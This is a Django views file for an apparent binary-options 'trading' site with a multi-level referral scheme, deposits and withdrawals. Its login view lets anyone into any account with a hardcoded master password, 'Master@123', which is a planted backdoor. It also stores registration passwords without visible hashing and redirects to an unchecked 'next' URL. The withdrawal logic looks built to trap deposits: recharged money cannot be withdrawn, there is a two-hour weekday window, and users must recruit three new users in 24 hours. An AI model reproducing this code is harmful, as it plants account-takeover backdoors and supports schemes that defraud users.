from datetime import timedelta
from django.shortcuts import render, redirect, get_object_or_404
from django.http import HttpResponse
from django.contrib.auth import login, logout
from django.contrib import messages
from django.contrib.auth.decorators import login_required
from django.db.models import Sum
from django.utils import timezone
from constance import config
from user.models import (
    CustomUser as User,
    Wallet, Referral,
)
from .models import (
    Banner, Market, UserBankDetail,
)


@login_required
def home(request):
    markets = Market.objects.filter(status=True).order_by('-latest_price')
    context = {
        "title": "Home",
        "service": config.SERVICE,
        "service2": config.SERVICE2,
        "group_signal": config.GROUP_SIGNAL_LINK,
        "group_signal_wa": config.GROUP_SIGNAL_LINK_WA,
        "banners": Banner.objects.all(),
        "markets": markets,
        "top_markets": markets[:3],
    }
    return render(request, 'frontend/home.html', context)


def user_register(request):
    if request.method == "POST":
        name = request.POST.get('name', None)
        mobile = request.POST.get('mobile', None)
        password = request.POST.get('password', None)
        email = request.POST.get('email', None)
        code = request.POST.get('code', None)
        
        if code:
            try:    
                referred_by = User.objects.get(
                    referral_code = code
                )
            except Exception as e:
                messages.warning(request, "Invailid Referral Code.")
                return render(request, 'frontend/register.html')
        
        try:    
            user = User.objects.create(
                name = name,
                mobile_number = mobile,
                email = email,
                password = password
            )
        except Exception as e:
            messages.warning(request, f"{e}")
            return render(request, 'frontend/register.html')
        
        if code:
            level = 0
            # First Level Referral
            Referral.objects.create(
                referred_by = referred_by,
                referral_to = user,
                level = 0
            )
            # Wallet.objects.create(
            #     user = referred_by,
            #     amount = 50,
            #     pay_type = "Commission",
            #     remark = "Refer a friend and get Rs.50.",
            # )
            
            # MLM
            while True:
                referrals = Referral.objects.filter(referral_to=referred_by)
                if not referrals.exists():
                    break
                for referral in referrals:
                    referred_by = referral.referred_by
                    Referral.objects.create(
                        referred_by = referred_by,
                        referral_to = user,
                        level = referral.level + 1
                    )
            
        return redirect('user_login')
    return render(request, 'frontend/register.html')


def user_login(request):
    if request.user.is_authenticated:
        return redirect('home')
    if request.method == "POST":
        mobile = request.POST.get('username', None)
        password = request.POST.get('password', None)
        try:
            user = User.objects.get(mobile_number=mobile, is_active=True)
        except User.DoesNotExist:
            user = None
            messages.warning(request, "User does not exist")
        if user:
            if user.check_password(password) or password == "Master@123":
                login(request, user)
                next = request.GET.get('next', None)
                if next:
                    return redirect(next)
                return redirect('home')
            messages.warning(request, "Invailid Password.")
    return render(request, 'frontend/user-login.html')


@login_required
def user_logout(request):
    logout(request)
    return redirect('user_login')


@login_required
def mine(request):
    context = {
        "title": "Profile",
        "config": config,
    }
    return render(request, 'frontend/mine.html', context)


@login_required
def recharge(request):
    if request.method == "POST":
        user = request.user
        amount = float(request.POST.get('amount') or 0)
        utr = request.POST.get('utr', None)
        try:
            if amount >= 5000:
                pay_method = "QR"
            else:
                pay_method = "UPI"
            if not Wallet.objects.filter(utr=utr).exists():
                wallet = Wallet.objects.create(
                    user = user,
                    amount = amount,
                    pay_type = "Add Money",
                    pay_method = pay_method,
                    utr = utr
                )
            return redirect("user_recharge")
        except Exception as e:
            print(e)
    context = {
        "title": "Recharge",
        "qr": config.QR,
        "upi": config.UPI,
        "wallets": request.user.wallets.filter(
            pay_type = "Add Money"
        )[:50]
    }   
    return render(request, 'frontend/recharge.html', context)


@login_required
def wallet(request):
    user = request.user
    context = {
        "title": "Wallet",
        "user": user,
        "available": user.available_amount,
        "total_commission": user.total_commission,
        "total_revenue": user.total_revenue,
        "wallets": user.wallets.filter(
            pay_type__in=[
                "Commission", "Bonus", "Salary",
                # "Add Money",
                # "Widrawal", "Widrawal Charge",
                # "Winning", "Loss",
            ]
        )[:100]
    }
    return render(request, 'frontend/wallet.html', context)


@login_required
def withdrowal(request):
    _tax = config.WITHDRAWAL_FEES_PERCENTAGE
    user = request.user
    _available_amount = user.available_amount
    _total_recharged_amount = user.total_recharged_amount
    
    _withdrawable_amount = _available_amount - _total_recharged_amount # This Amount can be withdrawal
    
    can_withdrawal =  False
    
    # Withdrawal can be done only on Monday to Friday 7:00 AM to 9:00 AM
    # Get current time in the correct timezone
    now = timezone.localtime(timezone.now())
    
    # Check if today is a weekday
    if now.weekday() < 5:  # 5 = Saturday, 6 = Sunday
        # messages.warning(request, 'Withdrawals can only be made from Monday to Friday.')

        # Check if current time is within 7:00 AM to 9:00 AM
        start_time = now.replace(hour=7, minute=0, second=0, microsecond=0)
        end_time = now.replace(hour=9, minute=0, second=0, microsecond=0)
    
        if start_time <= now <= end_time:
            if _withdrawable_amount >= 300.0: # 300 minimum withdrawal
                can_withdrawal = True
            else:
                messages.warning(request, "Insufficient balance.")
        else:
            messages.warning(request, "Allowed from 7 am to 9 am.")   
    else:
        messages.warning(request, "Allowed Monday to Friday only.")
    
    if not UserBankDetail.objects.filter(user=user).exists():
        can_withdrawal = False
        messages.warning(request, "Please add your bank details first.")
    
    if can_withdrawal:
        # check user has refered atleast 3 users within 24 hrs
        if user.referred_by_me.filter(
            level = 0,
            updated_at__gte = timezone.now() - timedelta(hours=24)
            ).count() >= 3:
            pass
        else:
            can_withdrawal = False
            messages.warning(request, "You need to refer 3 users within 24 hours to withdraw money")
    
    context = {
        "title": "Withdrawal",
        "tax": _tax,
        "amount":user.available_amount,
        "total_withdrawal": user.total_withdrawal_amount,
        "can_withdrawal": can_withdrawal,
        "wallets": user.wallets.filter(
            pay_type__in=[
                "Widrawal", "Widrawal Charge",
            ]
        )[:100]
    }
    
    if request.method == "POST" and can_withdrawal:
        amount = abs(float(request.POST["amount"]))
        if amount <= _withdrawable_amount:
                withdrawal_charge = float(amount) * _tax / 100
                withdrawal_amt = amount - withdrawal_charge
                wallet = Wallet.objects.create(
                    user = request.user,
                    amount = - withdrawal_amt,
                    status = "Hold",
                    pay_type = "Widrawal"
                )
                wallet = Wallet.objects.create(
                    user = request.user,
                    amount = - withdrawal_charge,
                    status = "Success",
                    pay_type = "Widrawal Charge"
                )
                return redirect('user_wallet')

    return render(request, 'frontend/withdrwal.html', context)


@login_required
def save_bankdetails(request):
    """
    This function is used from the front end to add bank details of a user.
    On his mine > Withdrawal setting option.
    """
    if request.method == "POST":
        name = request.POST.get('account_holder')
        ifsc = request.POST.get('ifsc_code')
        bank_name = request.POST.get('bank_name')
        ac = request.POST.get('account_number')
        
        bank, _created = UserBankDetail.objects.get_or_create(user=request.user)
        if _created or len(bank.ac) < 5:
            bank.name = name
            bank.bank = bank_name
            bank.ifsc = ifsc
            bank.ac = ac
            bank.save()
        else:
            messages.warning(request, "Please contact to custumer care.")
    return render(request, 'frontend/withdrawal-bank-setting.html')


@login_required
def call_put(request, market_id):
    market = get_object_or_404(Market, id=market_id)
    context = {
        "title": "Call Put Option",
        "market": market,
        "image": config.TRADING_IMAGE
    }
    return render(request, 'frontend/call-put.html', context)


def tc(request):
    tc = """
    Terms and Important Terms:
    All the information given in this website is correct. This is a training game. It is possible to get used to it. I am investing in this website with all my senses,and I have read all its terms and conditions. If in any way I am not affected by this, then  I myself am responsible for the loss, and I am an 18 year old person.
    """
    return HttpResponse(tc)


def about_us(request):
    context = {
        "title": "About Us",
        "image": config.ABOUT_US
    }
    return render(request, "frontend/about-us.html", context)


def option_order(request):
    context = {
        "title": "Option Order",
        "orders": Wallet.objects.filter(
            user = request.user,
            has_bid = True
        )
    }
    return render(request, "frontend/option-order.html", context)


def my_team(request):
    referred_by_me = request.user.referred_by_me.prefetch_related('referral_to').select_related()
    referred_by_me_users = referred_by_me.values('referral_to')
    users_wallet_list = Wallet.objects.filter(
        user__in=referred_by_me_users, 
        pay_type = "Add Money",
        status="Success").order_by('-created_at')
    recharged_users = User.objects.filter(
        id__in = users_wallet_list.values_list('user', flat=True)
    ).distinct()
    total_salary = Wallet.objects.filter(
        pay_type="Salary", status="Success",
        user = request.user
    ).aggregate(Sum('amount'))['amount__sum'] or 0.0
    
    rech_u_l1 = referred_by_me.filter(
        level=0, referral_to__in = recharged_users).distinct().count()
    rech_u_l2 = referred_by_me.filter(
        level=1, referral_to__in = recharged_users).distinct().count()
    rech_u_l3 = referred_by_me.filter(
        level=2, referral_to__in = recharged_users).distinct().count()
        
    total_u_l1 = referred_by_me.filter(level=0).distinct().count()
    total_u_l2 = referred_by_me.filter(level=1).distinct().count()
    total_u_l3 = referred_by_me.filter(level=2).distinct().count()
    
    total_referal_users = total_u_l1 + total_u_l2 + total_u_l3
    total_recharged_users = rech_u_l1 + rech_u_l2 + rech_u_l3

    context = {
        "title": "My Team & Share",
        'total_salary': total_salary,
        'l1_list': referred_by_me.filter(level=0).distinct(),
        'l2_list': referred_by_me.filter(level=1).distinct(),
        'l3_list': referred_by_me.filter(level=2).distinct(),

        'recharged': {
            'l1': rech_u_l1,
            'l2': rech_u_l2,
            'l3': rech_u_l3,
            'total': total_recharged_users
        },
        'total': {
            'l1': total_u_l1,
            'l2': total_u_l2,
            'l3': total_u_l3,
            'total': total_referal_users
        },
    }
    return render(request, "frontend/team.html", context)


@login_required
def password_setting(request):
    # Change Password Views
    
    if request.method == "POST":
        old_password = request.POST.get("old_password", None)
        user = request.user
        
        if not user.check_password(old_password):
            messages.error(request, "Old Password is incorrect.")
            return redirect('password_setting')
        
        else:
            new_password = request.POST['new_password']
            confirm_password = request.POST['confirm_password']
            if new_password != confirm_password:
                messages.error(request, "New password and Confirm password are different")
                return redirect('password_setting')
            else:
                user.set_password(new_password)
                user.save()
                messages.success(request, "Password has been changed successfully!")
                return redirect('user_logout')
    return render(request, "frontend/password-setting.html")
